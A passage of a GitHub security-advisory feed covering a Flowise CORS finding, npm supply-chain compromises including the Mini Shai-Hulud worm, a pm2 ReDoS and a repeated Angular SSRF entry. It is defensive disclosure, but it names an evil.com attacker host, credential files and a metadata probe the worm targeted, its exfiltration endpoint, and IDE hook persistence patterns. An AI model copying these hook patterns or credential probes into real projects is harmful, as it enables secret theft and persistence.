<li>Combined with Finding 3 (TTS credential abuse), enables drive-by credential abuse via malicious webpages</li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Remove the hardcoded CORS wildcard and let the server's CORS middleware handle the headers:</p>
<pre><code class="language-typescript">// Remove these lines:
// res.setHeader('Access-Control-Allow-Origin', '*')
// res.setHeader('Access-Control-Allow-Headers', 'Cache-Control')
</code></pre>
<hr>
<h2 id="references">References</h2>
<ul>
<li><code>packages/server/src/controllers/text-to-speech/index.ts</code> line 83</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-m837-xvxr-vqwg">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-m837-xvxr-vqwg</a></li>
<li><a href="https://github.com/advisories/GHSA-m837-xvxr-vqwg">https://github.com/advisories/GHSA-m837-xvxr-vqwg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m837-xvxr-vqwg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-20T15:38:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@cap-js/db-service]  Supply chain compromise via malicious package versions (@cap-js/sqlite,  @cap-js/postgres, @cap-js/db-service)]]></title>
        <id>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</id>
        <link href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8"/>
        <updated>2026-05-20T15:33:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>On April 29, 2026, compromised versions of <code>@cap-js/sqlite@2.2.2</code>, <code>@cap-js/postgres@2.2.2</code>, and <code>@cap-js/db-service@2.10.1</code> were published.
The malicious packages harvested credentials and attempted self-propagation.
If a compromised version was installed, all credentials accessible on that machine (npm tokens, cloud provider credentials, SSH keys, GitHub PATs) should be considered compromised.</p>
<h2 id="patches">Patches</h2>
<p>Upgrade to <code>@cap-js/sqlite</code> &gt;= 2.4.0, <code>@cap-js/postgres</code> &gt;= 2.3.0, <code>@cap-js/db-service</code> &gt;= 2.11.0.
If a compromised version was ever installed, rotate all affected credentials.</p>
<h2 id="workarounds">Workarounds</h2>
<p>No workarounds.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8</a></li>
<li><a href="https://me.sap.com/notes/3747787">https://me.sap.com/notes/3747787</a></li>
<li><a href="https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html">https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html</a></li>
<li><a href="https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared">https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared</a></li>
<li><a href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/advisories/GHSA-pvw4-cvr4-97p8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-20T15:33:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@cap-js/postgres]  Supply chain compromise via malicious package versions (@cap-js/sqlite,  @cap-js/postgres, @cap-js/db-service)]]></title>
        <id>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</id>
        <link href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8"/>
        <updated>2026-05-20T15:33:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>On April 29, 2026, compromised versions of <code>@cap-js/sqlite@2.2.2</code>, <code>@cap-js/postgres@2.2.2</code>, and <code>@cap-js/db-service@2.10.1</code> were published.
The malicious packages harvested credentials and attempted self-propagation.
If a compromised version was installed, all credentials accessible on that machine (npm tokens, cloud provider credentials, SSH keys, GitHub PATs) should be considered compromised.</p>
<h2 id="patches">Patches</h2>
<p>Upgrade to <code>@cap-js/sqlite</code> &gt;= 2.4.0, <code>@cap-js/postgres</code> &gt;= 2.3.0, <code>@cap-js/db-service</code> &gt;= 2.11.0.
If a compromised version was ever installed, rotate all affected credentials.</p>
<h2 id="workarounds">Workarounds</h2>
<p>No workarounds.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8</a></li>
<li><a href="https://me.sap.com/notes/3747787">https://me.sap.com/notes/3747787</a></li>
<li><a href="https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html">https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html</a></li>
<li><a href="https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared">https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared</a></li>
<li><a href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/advisories/GHSA-pvw4-cvr4-97p8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-20T15:33:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@cap-js/sqlite]  Supply chain compromise via malicious package versions (@cap-js/sqlite,  @cap-js/postgres, @cap-js/db-service)]]></title>
        <id>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</id>
        <link href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8"/>
        <updated>2026-05-20T15:33:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>On April 29, 2026, compromised versions of <code>@cap-js/sqlite@2.2.2</code>, <code>@cap-js/postgres@2.2.2</code>, and <code>@cap-js/db-service@2.10.1</code> were published.
The malicious packages harvested credentials and attempted self-propagation.
If a compromised version was installed, all credentials accessible on that machine (npm tokens, cloud provider credentials, SSH keys, GitHub PATs) should be considered compromised.</p>
<h2 id="patches">Patches</h2>
<p>Upgrade to <code>@cap-js/sqlite</code> &gt;= 2.4.0, <code>@cap-js/postgres</code> &gt;= 2.3.0, <code>@cap-js/db-service</code> &gt;= 2.11.0.
If a compromised version was ever installed, rotate all affected credentials.</p>
<h2 id="workarounds">Workarounds</h2>
<p>No workarounds.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8</a></li>
<li><a href="https://me.sap.com/notes/3747787">https://me.sap.com/notes/3747787</a></li>
<li><a href="https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html">https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html</a></li>
<li><a href="https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared">https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared</a></li>
<li><a href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/advisories/GHSA-pvw4-cvr4-97p8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-20T15:33:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pm2] pm2 Regular Expression Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-x5gf-qvw8-r2rm</id>
        <link href="https://github.com/advisories/GHSA-x5gf-qvw8-r2rm"/>
        <updated>2026-05-20T02:06:27.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability classified as problematic was found in Unitech pm2 prior to 7.0.0. This vulnerability affects unknown code of the file /lib/tools/Config.js. The manipulation leads to inefficient regular expression complexity. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5891">https://nvd.nist.gov/vuln/detail/CVE-2025-5891</a></li>
<li><a href="https://github.com/Unitech/pm2/pull/5971">https://github.com/Unitech/pm2/pull/5971</a></li>
<li><a href="https://gist.github.com/mmmsssttt404/407e2ffe3e0eaa393ad923a86316a385">https://gist.github.com/mmmsssttt404/407e2ffe3e0eaa393ad923a86316a385</a></li>
<li><a href="https://vuldb.com/?ctiid.311662">https://vuldb.com/?ctiid.311662</a></li>
<li><a href="https://vuldb.com/?id.311662">https://vuldb.com/?id.311662</a></li>
<li><a href="https://vuldb.com/?submit.585750">https://vuldb.com/?submit.585750</a></li>
<li><a href="https://github.com/Unitech/pm2/issues/6075">https://github.com/Unitech/pm2/issues/6075</a></li>
<li><a href="https://github.com/Unitech/pm2/commit/8b9354800a1d157cb9503a3ec414ef1e4700dc1c">https://github.com/Unitech/pm2/commit/8b9354800a1d157cb9503a3ec414ef1e4700dc1c</a></li>
<li><a href="https://github.com/Unitech/pm2/blob/ba62cae9b9b7116ee758b70f538919a52515fa26/CHANGELOG.md?plain=1#L36">https://github.com/Unitech/pm2/blob/ba62cae9b9b7116ee758b70f538919a52515fa26/CHANGELOG.md?plain=1#L36</a></li>
<li><a href="https://github.com/Unitech/pm2/releases/tag/v7.0.0">https://github.com/Unitech/pm2/releases/tag/v7.0.0</a></li>
<li><a href="https://github.com/advisories/GHSA-x5gf-qvw8-r2rm">https://github.com/advisories/GHSA-x5gf-qvw8-r2rm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5gf-qvw8-r2rm</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-06-09T21:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/platform-server] @angular/platform-server: SSRF via Hostname Hijacking]]></title>
        <id>https://github.com/advisories/GHSA-rfh7-fxqc-q52v</id>
        <link href="https://github.com/advisories/GHSA-rfh7-fxqc-q52v"/>
        <updated>2026-05-19T20:29:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Server-Side Request Forgery (SSRF) vulnerability exists in <code>@angular/platform-server</code>. The issue stems from how the server-side rendering (SSR) engine processes the request URL provided to the rendering entry points.</p>
<p>When an absolute-form URL (e.g., <code>http://evil.com</code>) is passed to the rendering engine, the internal <code>ServerPlatformLocation</code> can be manipulated into adopting the attacker-controlled domain as the "current" hostname.</p>
<p>Consequently, any relative <code>HttpClient</code> requests or <code>PlatformLocation.hostname</code> references are redirected to the attacker controlled server, potentially exposing internal APIs or metadata services.</p>
<h3 id="fix-information">Fix Information</h3>
<p>The vulnerability is mitigated by introducing an Allowlist Mechanism directly into the core rendering APIs.
The renderModule and renderApplication functions now include an allowedHosts configuration option. The rendering engine validates the hostname extracted from the request URL against this list before proceeding. If the hostname does not match an allowed entry, the engine prevents the hostname hijacking, ensuring that HttpClient requests remain restricted to trusted domains.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>22.0.0-next.12</li>
<li>21.2.13</li>
<li>20.3.21</li>
<li>19.2.22</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Developers unable to update immediately should implement strict URL validation in their server entry point (e.g., <code>server.ts</code>). Ensure that <code>req.url</code> is validated against a known list of trusted hostnames or normalized to a relative path before being passed to<code>renderApplication</code> or <code>renderModule</code>.</p>
<pre><code class="language-TypeScript">// Example manual normalization in Express
app.get('*', (req, res, next) =&gt; {
  const trustedHost = 'localhost:4000';
  // Ensure the request target matches expectations
  if (req.headers.host !== trustedHost) {
     return res.status(403).send('Forbidden');
  }
  next();
});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v">https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v</a></li>
<li><a href="https://github.com/angular/angular/pull/68570">https://github.com/angular/angular/pull/68570</a></li>
<li><a href="https://github.com/advisories/GHSA-rfh7-fxqc-q52v">https://github.com/advisories/GHSA-rfh7-fxqc-q52v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfh7-fxqc-q52v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T20:29:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/platform-server] @angular/platform-server: SSRF via Hostname Hijacking]]></title>
        <id>https://github.com/advisories/GHSA-rfh7-fxqc-q52v</id>
        <link href="https://github.com/advisories/GHSA-rfh7-fxqc-q52v"/>
        <updated>2026-05-19T20:29:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Server-Side Request Forgery (SSRF) vulnerability exists in <code>@angular/platform-server</code>. The issue stems from how the server-side rendering (SSR) engine processes the request URL provided to the rendering entry points.</p>
<p>When an absolute-form URL (e.g., <code>http://evil.com</code>) is passed to the rendering engine, the internal <code>ServerPlatformLocation</code> can be manipulated into adopting the attacker-controlled domain as the "current" hostname.</p>
<p>Consequently, any relative <code>HttpClient</code> requests or <code>PlatformLocation.hostname</code> references are redirected to the attacker controlled server, potentially exposing internal APIs or metadata services.</p>
<h3 id="fix-information">Fix Information</h3>
<p>The vulnerability is mitigated by introducing an Allowlist Mechanism directly into the core rendering APIs.
The renderModule and renderApplication functions now include an allowedHosts configuration option. The rendering engine validates the hostname extracted from the request URL against this list before proceeding. If the hostname does not match an allowed entry, the engine prevents the hostname hijacking, ensuring that HttpClient requests remain restricted to trusted domains.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>22.0.0-next.12</li>
<li>21.2.13</li>
<li>20.3.21</li>
<li>19.2.22</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Developers unable to update immediately should implement strict URL validation in their server entry point (e.g., <code>server.ts</code>). Ensure that <code>req.url</code> is validated against a known list of trusted hostnames or normalized to a relative path before being passed to<code>renderApplication</code> or <code>renderModule</code>.</p>
<pre><code class="language-TypeScript">// Example manual normalization in Express
app.get('*', (req, res, next) =&gt; {
  const trustedHost = 'localhost:4000';
  // Ensure the request target matches expectations
  if (req.headers.host !== trustedHost) {
     return res.status(403).send('Forbidden');
  }
  next();
});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v">https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v</a></li>
<li><a href="https://github.com/angular/angular/pull/68570">https://github.com/angular/angular/pull/68570</a></li>
<li><a href="https://github.com/advisories/GHSA-rfh7-fxqc-q52v">https://github.com/advisories/GHSA-rfh7-fxqc-q52v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfh7-fxqc-q52v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T20:29:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/platform-server] @angular/platform-server: SSRF via Hostname Hijacking]]></title>
        <id>https://github.com/advisories/GHSA-rfh7-fxqc-q52v</id>
        <link href="https://github.com/advisories/GHSA-rfh7-fxqc-q52v"/>
        <updated>2026-05-19T20:29:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Server-Side Request Forgery (SSRF) vulnerability exists in <code>@angular/platform-server</code>. The issue stems from how the server-side rendering (SSR) engine processes the request URL provided to the rendering entry points.</p>
<p>When an absolute-form URL (e.g., <code>http://evil.com</code>) is passed to the rendering engine, the internal <code>ServerPlatformLocation</code> can be manipulated into adopting the attacker-controlled domain as the "current" hostname.</p>
<p>Consequently, any relative <code>HttpClient</code> requests or <code>PlatformLocation.hostname</code> references are redirected to the attacker controlled server, potentially exposing internal APIs or metadata services.</p>
<h3 id="fix-information">Fix Information</h3>
<p>The vulnerability is mitigated by introducing an Allowlist Mechanism directly into the core rendering APIs.
The renderModule and renderApplication functions now include an allowedHosts configuration option. The rendering engine validates the hostname extracted from the request URL against this list before proceeding. If the hostname does not match an allowed entry, the engine prevents the hostname hijacking, ensuring that HttpClient requests remain restricted to trusted domains.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>22.0.0-next.12</li>
<li>21.2.13</li>
<li>20.3.21</li>
<li>19.2.22</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Developers unable to update immediately should implement strict URL validation in their server entry point (e.g., <code>server.ts</code>). Ensure that <code>req.url</code> is validated against a known list of trusted hostnames or normalized to a relative path before being passed to<code>renderApplication</code> or <code>renderModule</code>.</p>
<pre><code class="language-TypeScript">// Example manual normalization in Express
app.get('*', (req, res, next) =&gt; {
  const trustedHost = 'localhost:4000';
  // Ensure the request target matches expectations
  if (req.headers.host !== trustedHost) {
     return res.status(403).send('Forbidden');
  }
  next();
});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v">https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v</a></li>
<li><a href="https://github.com/angular/angular/pull/68570">https://github.com/angular/angular/pull/68570</a></li>
<li><a href="https://github.com/advisories/GHSA-rfh7-fxqc-q52v">https://github.com/advisories/GHSA-rfh7-fxqc-q52v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfh7-fxqc-q52v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T20:29:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/platform-server] @angular/platform-server: SSRF via Hostname Hijacking]]></title>
        <id>https://github.com/advisories/GHSA-rfh7-fxqc-q52v</id>
        <link href="https://github.com/advisories/GHSA-rfh7-fxqc-q52v"/>
        <updated>2026-05-19T20:29:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Server-Side Request Forgery (SSRF) vulnerability exists in <code>@angular/platform-server</code>. The issue stems from how the server-side rendering (SSR) engine processes the request URL provided to the rendering entry points.</p>
<p>When an absolute-form URL (e.g., <code>http://evil.com</code>) is passed to the rendering engine, the internal <code>ServerPlatformLocation</code> can be manipulated into adopting the attacker-controlled domain as the "current" hostname.</p>
<p>Consequently, any relative <code>HttpClient</code> requests or <code>PlatformLocation.hostname</code> references are redirected to the attacker controlled server, potentially exposing internal APIs or metadata services.</p>
<h3 id="fix-information">Fix Information</h3>
<p>The vulnerability is mitigated by introducing an Allowlist Mechanism directly into the core rendering APIs.
The renderModule and renderApplication functions now include an allowedHosts configuration option. The rendering engine validates the hostname extracted from the request URL against this list before proceeding. If the hostname does not match an allowed entry, the engine prevents the hostname hijacking, ensuring that HttpClient requests remain restricted to trusted domains.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>22.0.0-next.12</li>
<li>21.2.13</li>
<li>20.3.21</li>
<li>19.2.22</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Developers unable to update immediately should implement strict URL validation in their server entry point (e.g., <code>server.ts</code>). Ensure that <code>req.url</code> is validated against a known list of trusted hostnames or normalized to a relative path before being passed to<code>renderApplication</code> or <code>renderModule</code>.</p>
<pre><code class="language-TypeScript">// Example manual normalization in Express
app.get('*', (req, res, next) =&gt; {
  const trustedHost = 'localhost:4000';
  // Ensure the request target matches expectations
  if (req.headers.host !== trustedHost) {
     return res.status(403).send('Forbidden');
  }
  next();
});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v">https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v</a></li>
<li><a href="https://github.com/angular/angular/pull/68570">https://github.com/angular/angular/pull/68570</a></li>
<li><a href="https://github.com/advisories/GHSA-rfh7-fxqc-q52v">https://github.com/advisories/GHSA-rfh7-fxqc-q52v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfh7-fxqc-q52v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T20:29:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/platform-server] @angular/platform-server: SSRF via Hostname Hijacking]]></title>
        <id>https://github.com/advisories/GHSA-rfh7-fxqc-q52v</id>
        <link href="https://github.com/advisories/GHSA-rfh7-fxqc-q52v"/>
        <updated>2026-05-19T20:29:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Server-Side Request Forgery (SSRF) vulnerability exists in <code>@angular/platform-server</code>. The issue stems from how the server-side rendering (SSR) engine processes the request URL provided to the rendering entry points.</p>
<p>When an absolute-form URL (e.g., <code>http://evil.com</code>) is passed to the rendering engine, the internal <code>ServerPlatformLocation</code> can be manipulated into adopting the attacker-controlled domain as the "current" hostname.</p>
<p>Consequently, any relative <code>HttpClient</code> requests or <code>PlatformLocation.hostname</code> references are redirected to the attacker controlled server, potentially exposing internal APIs or metadata services.</p>
<h3 id="fix-information">Fix Information</h3>
<p>The vulnerability is mitigated by introducing an Allowlist Mechanism directly into the core rendering APIs.
The renderModule and renderApplication functions now include an allowedHosts configuration option. The rendering engine validates the hostname extracted from the request URL against this list before proceeding. If the hostname does not match an allowed entry, the engine prevents the hostname hijacking, ensuring that HttpClient requests remain restricted to trusted domains.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>22.0.0-next.12</li>
<li>21.2.13</li>
<li>20.3.21</li>
<li>19.2.22</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Developers unable to update immediately should implement strict URL validation in their server entry point (e.g., <code>server.ts</code>). Ensure that <code>req.url</code> is validated against a known list of trusted hostnames or normalized to a relative path before being passed to<code>renderApplication</code> or <code>renderModule</code>.</p>
<pre><code class="language-TypeScript">// Example manual normalization in Express
app.get('*', (req, res, next) =&gt; {
  const trustedHost = 'localhost:4000';
  // Ensure the request target matches expectations
  if (req.headers.host !== trustedHost) {
     return res.status(403).send('Forbidden');
  }
  next();
});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v">https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v</a></li>
<li><a href="https://github.com/angular/angular/pull/68570">https://github.com/angular/angular/pull/68570</a></li>
<li><a href="https://github.com/advisories/GHSA-rfh7-fxqc-q52v">https://github.com/advisories/GHSA-rfh7-fxqc-q52v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfh7-fxqc-q52v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T20:29:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@beproduct/nestjs-auth] Malicious code in @beproduct/nestjs-auth (0.1.2 through 0.1.19) — Mini Shai-Hulud worm]]></title>
        <id>https://github.com/advisories/GHSA-6xwp-cp5h-q856</id>
        <link href="https://github.com/advisories/GHSA-6xwp-cp5h-q856"/>
        <updated>2026-05-19T20:28:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Between 2026-05-11 20:19 UTC and 22:56 UTC, an attacker used a compromised npm publish token to publish 18 malicious versions of <code>@beproduct/nestjs-auth</code> (0.1.2 through 0.1.19). The packages contained payloads from the <strong>Mini Shai-Hulud</strong> npm supply-chain worm campaign described by <a href="https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised">Aikido Security</a>.</p>
<p>npm Security removed the malicious versions from the registry shortly after publication, but anyone who ran <code>npm install @beproduct/nestjs-auth</code> resolving to any version in the affected range during that window executed the malicious postinstall script and is potentially compromised.</p>
<p>Version <code>0.1.20</code> is a clean republish from the original <code>0.1.1</code> source tree.</p>
<h2 id="impact">Impact</h2>
<p>The postinstall payload attempted to harvest:</p>
<ul>
<li>npm tokens (from <code>~/.npmrc</code>)</li>
<li>GitHub personal access tokens, OAuth tokens (<code>gho_*</code>), and Actions OIDC tokens</li>
<li>AWS credentials (from environment variables and <code>~/.aws/credentials</code>)</li>
<li>HashiCorp Vault tokens</li>
<li>Other secrets present in environment variables</li>
</ul>
<p>Exfiltration target: <code>https://filev2.getsession.org</code>. The worm also wrote persistence artefacts (<code>tanstack_runner.js</code>, <code>router_init.js</code>, <code>setup.mjs</code>, plus IDE-hook configurations in <code>.claude/</code> and <code>.vscode/</code>) into the developer's working tree where the malicious install ran.</p>
<h2 id="indicators-of-compromise">Indicators of compromise</h2>
<table>
<thead>
<tr>
<th>Type</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>File name (payload)</td>
<td><code>tanstack_runner.js</code>, <code>router_init.js</code>, <code>router_runtime.js</code></td>
</tr>
<tr>
<td>SHA-256 (tanstack_runner.js)</td>
<td><code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></td>
</tr>
<tr>
<td>SHA-256 (router_init.js)</td>
<td><code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></td>
</tr>
<tr>
<td>Exfil endpoint</td>
<td><code>filev2.getsession.org</code></td>
</tr>
<tr>
<td>Cloud metadata probe</td>
<td><code>169.254.169.254/latest/meta-data/iam/security-credentials/</code></td>
</tr>
<tr>
<td>npm token endpoint</td>
<td><code>registry.npmjs.org/-/npm/v1/tokens</code></td>
</tr>
<tr>
<td>Vault probe</td>
<td><code>vault.svc.cluster.local:8200</code></td>
</tr>
<tr>
<td>IDE hook pattern</td>
<td><code>.claude/settings.json</code> <code>SessionStart</code> hook + <code>.vscode/tasks.json</code> <code>runOn: "folderOpen"</code> running <code>node .claude/setup.mjs</code> or <code>node .vscode/setup.mjs</code></td>
</tr>
</tbody></table>
<h2 id="mitigation">Mitigation</h2>
<p>If you installed any version in the range <code>&gt;=0.1.2 &lt;=0.1.19</code>:</p>
<ol>
<li><strong>Remove the package and clean the npm cache:</strong><pre><code class="language-bash">npm uninstall @beproduct/nestjs-auth
npm cache clean --force
</code></pre>
</li>
<li><strong>Install the clean version:</strong><pre><code class="language-bash">npm install @beproduct/nestjs-auth@0.1.20
</code></pre>
</li>
<li><strong>Rotate every credential present in the install environment</strong>, including:<ul>
<li>All npm publish tokens (<code>https://www.npmjs.com/settings/&lt;you&gt;/tokens</code>)</li>
<li>All GitHub PATs and OAuth tokens (<code>https://github.com/settings/applications</code> + <code>https://github.com/settings/tokens</code>)</li>
<li>AWS access keys</li>
<li>HashiCorp Vault tokens</li>
<li>Any other secret that was in env vars or config files at install time</li>
</ul>
</li>
<li><strong>Scan affected hosts</strong> for the indicators of compromise above. If any are found, treat the host as compromised and reimage.</li>
<li><strong>Check committed repository history</strong> for unexpected additions in <code>.claude/</code> or <code>.vscode/</code> directories — the worm is known to commit <code>setup.mjs</code> + hook configs to PR branches via automated agent runtimes.</li>
</ol>
<h2 id="timeline-utc">Timeline (UTC)</h2>
<table>
<thead>
<tr>
<th>Time</th>
<th>Event</th>
</tr>
</thead>
<tbody><tr>
<td>2026-05-11 20:19:43</td>
<td>First malicious version (<code>0.1.2</code>) published</td>
</tr>
<tr>
<td>2026-05-11 22:56:39</td>
<td>Final malicious version (<code>0.1.19</code>) published — 18 versions in 2h37m</td>
</tr>
<tr>
<td>2026-05-12 ~14:12</td>
<td>npm Security removes the malicious versions from the registry</td>
</tr>
<tr>
<td>2026-05-13</td>
<td>BeProduct discovers the incident via Aikido's public disclosure</td>
</tr>
<tr>
<td>2026-05-14</td>
<td>Compromised npm publish token revoked; BeProduct GitHub OAuth credentials rotated</td>
</tr>
<tr>
<td>2026-05-14</td>
<td>Clean release <code>0.1.20</code> published; this advisory filed</td>
</tr>
</tbody></table>
<h2 id="root-cause">Root cause</h2>
<p>The compromised npm publish token was harvested by a Mini-Shai-Hulud-infected transitive dependency in an automated GitHub coding-agent runtime that had read access to the <code>NPM_TOKEN</code> GitHub Actions secret for an unrelated repository under the same npm publisher account. The publish itself was performed by the attacker against the public npm registry; the source repository for this package was not modified by the attacker.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised">https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised</a></li>
<li><a href="https://www.aikido.dev/blog/checklist-github-actions">https://www.aikido.dev/blog/checklist-github-actions</a></li>
</ul>
<pre><code>### References

- &lt;https://github.com/BeProduct/beproduct-org-nestjs-auth/security/advisories/GHSA-6xwp-cp5h-q856&gt;
- &lt;https://www.aikido.dev/blog/checklist-github-actions&gt;
- &lt;https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised&gt;
- &lt;https://github.com/advisories/GHSA-6xwp-cp5h-q856&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6xwp-cp5h-q856</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-19T20:28:07.000Z</published>
    </entry>
    <entry>
